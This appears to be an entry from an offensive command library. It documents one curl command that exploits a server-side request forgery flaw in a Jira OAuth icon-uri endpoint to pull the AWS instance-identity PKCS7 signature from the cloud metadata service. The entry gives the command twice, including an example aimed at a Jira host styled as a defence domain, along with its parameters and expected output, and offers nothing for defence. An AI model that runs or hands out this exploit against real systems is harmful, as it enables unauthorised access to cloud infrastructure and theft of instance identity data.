---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"
tags:
  - ssrf
  - aws
  - signature
type: command
output: MIIC... (PKCS7 base64 data)
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.290Z'
id: d7a9ae78-7659-4922-a4c1-949aafd1ee6e
verified: false
validated: true
submitted: true
---
# curl-ssrf-pkcs7-signature

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"
```

## Description

Retrieves the PKCS7 signature for the instance identity.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"
```

## Expected Output

Base64-encoded PKCS7 data.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
